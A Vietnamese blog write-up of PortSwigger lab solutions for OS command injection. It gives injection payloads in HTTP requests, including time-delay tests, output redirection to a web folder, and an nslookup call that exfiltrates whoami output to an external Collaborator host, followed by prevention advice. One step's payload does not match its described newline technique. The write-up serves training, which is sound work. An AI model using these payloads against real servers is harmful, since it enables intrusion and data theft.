---
title: "[PortSwigger Lab] - OS Command Injection"
description: Solution of OS Command Injection on PortSwigger Lab
date: 2025-06-01 21:00:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, os command injection]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-01-portswigger-lab-os-command-injection/command-injection.jpg
    alt: OS Command Injection
---

## Introduction
---
**OS Command Injection** (còn gọi là **Shell Injection**) là một lỗ hổng bảo mật cho phép kẻ tấn công chèn và thực thi các lệnh hệ điều hành (như **Linux** hoặc **Windows**) trên máy chủ mà ứng dụng đang chạy.

## Solve OS Command Injection Lab
---
### Lab: OS command injection, simple case
Gửi request với storedId có chứa `injection`
```http
POST /product/stock HTTP/2
Host: 0a9a004a03f80ca4810489f000550085.web-security-academy.net
...
productId=20&storeId=1|whoami
```

- Dùng pipe `|` để truyền **output (stdout)** của lệnh bên trái sang làm **input (stdin)** của lệnh bên phải.
- Trên thực tế, `whoami` không nhận input từ stdin – nó chỉ in ra username rồi kết thúc.

### Lab: Blind OS command injection with time delays
- Submit 1 feadback bất kì, gửi request đến **Repeater**
- Gửi lại với các request sau:

- Dùng toán từ `OR (||)` để thực hiện lệnh khác sau khi lệnh gửi email lỗi
```http
POST /feedback/submit HTTP/2
Host: 0af200430494500780c6bcfb0081002f.web-security-academy.net
...
csrf=Idkvt9a5GZZDZDTsMAgG4PotPi2BT0N0&name=a&email=a||sleep+10||&subject=a&message=a
```

- Sử dụng `;` để tách lệnh và `#` để command lệnh đằng sau
```http
POST /feedback/submit HTTP/2
Host: 0af200430494500780c6bcfb0081002f.web-security-academy.net
...
csrf=Idkvt9a5GZZDZDTsMAgG4PotPi2BT0N0&name=a&email=a%40gmail.com+;+sleep+10+#&subject=a&message=a
```

- Sử dụng `\n` được mã hóa thành `%0a` để xuống dòng và `#` để command lệnh đằng sau
```http
POST /feedback/submit HTTP/2
Host: 0af200430494500780c6bcfb0081002f.web-security-academy.net
...
csrf=Idkvt9a5GZZDZDTsMAgG4PotPi2BT0N0&name=a&email=a%40gmail.com+;+sleep+10+#&subject=a&message=a
```

### Blind OS command injection with output redirection
Ý tưởng: **Submit feedback** đi kèm việc tạo ra file chứa nội dung cần lấy vào `/var/www/images/` rồi lấy nó giống như lấy file ảnh
#### Checking OS command can be excuted
- Request:
```http
POST /feedback/submit HTTP/2
Host: 0a7700ba034387a282e79c1a004200a4.web-security-academy.net
...
csrf=0p6kVqRROiiK4hK8IgaUtSF7uxrocNMp&name=a&email=a%40gmail.com+;+sleep+10+#&subject=a&message=a
```
- Nếu nó thực sự hoạt động sẽ response chậm 10s

#### Exploit
- Request:
```http
POST /feedback/submit HTTP/2
Host: 0a7700ba034387a282e79c1a004200a4.web-security-academy.net
...
csrf=0p6kVqRROiiK4hK8IgaUtSF7uxrocNMp&name=a&email=a%40gmail.com+;+whoami>/var/www/images/whoami.txt+#&subject=a&message=a
```

- Đọc file được tạo the đường dẫn
```
https://0a7700ba034387a282e79c1a004200a4.web-security-academy.net/image?filename=whoami.txt
```

### Lab: Blind OS command injection with out-of-band interaction
#### Checking OS command can be excuted
- Request:
```http
POST /feedback/submit HTTP/2
Host: 0a7700ba034387a282e79c1a004200a4.web-security-academy.net
...
csrf=0p6kVqRROiiK4hK8IgaUtSF7uxrocNMp&name=a&email=a%40gmail.com+;+sleep+10+#&subject=a&message=a
```
- Nếu nó thực sự hoạt động sẽ response chậm 10s
- ở đây nó đã chặn lệnh sleep 10 

Ý tưởng: sử dụng nslookup ra 1 server bên ngoài để kiếm tra OS command có hoạt động hay không

#### Exploit
- Sử dụng **Burp Colloborator** để làm server nhận request
- Request:
```http
POST /feedback/submit HTTP/2
Host: 0a7700ba034387a282e79c1a004200a4.web-security-academy.net
...
csrf=shDKgLg9f2ImcfCVEmCOxKGfnhy5KLca&name=a&email=a%40gmail.com+;+nslookup+0jk9byyvrh6otbzhihvxlok9y04rsig7.oastify.com+#&subject=a&message=a
```
- Poll now để lấy request về và xác nhận 

### Blind OS command injection with out-of-band data exfiltration
Tương tự như lab trên nhưng ta cần lấy nội dung của lệnh `whoami`
Payload:
```http
POST /feedback/submit HTTP/2
Host: 0a7700ba034387a282e79c1a004200a4.web-security-academy.net
...
csrf=shDKgLg9f2ImcfCVEmCOxKGfnhy5KLca&name=a&email=a%40gmail.com+;+nslookup+`whoami`.0jk9byyvrh6otbzhihvxlok9y04rsig7.oastify.com+#&subject=a&message=a
```
Hoặc
```http
POST /feedback/submit HTTP/2
Host: 0a7700ba034387a282e79c1a004200a4.web-security-academy.net
...
csrf=shDKgLg9f2ImcfCVEmCOxKGfnhy5KLca&name=a&email=a%40gmail.com+;+nslookup+$(whoami).0jk9byyvrh6otbzhihvxlok9y04rsig7.oastify.com+#&subject=a&message=a
```
- Trên các hệ thống dựa trên **UNIX**, bạn cũng có thể sử dụng **BackTicks(`` `...` ``)** hoặc ký tự **đồng đô la `$()`**để thực hiện thực thi nội tuyến của một lệnh được tiêm trong lệnh gốc

## Prevent
---
1. Cách tốt nhất: Không gọi lệnh hệ điều hành
2. Nếu bắt buộc phải gọi shell
    - Dùng danh sách trắng (whitelist)
    - Chỉ cho phép số nếu cần
    - Chỉ cho phép ký tự chữ và số (alphanumeric)

3. Không nên làm: "escape" ký tự đặc biệt
Đừng cố gắng "lọc" hoặc "thoát" các ký tự như ;, |, & trong input người dùng. Vì sao?
- Hacker biết rất nhiều cách mã hóa để vượt qua
- Escape không thể bảo vệ 100%
- Rất dễ sót lọt những trường hợp đặc biệt

---
Goodluck! 🍀🍀🍀
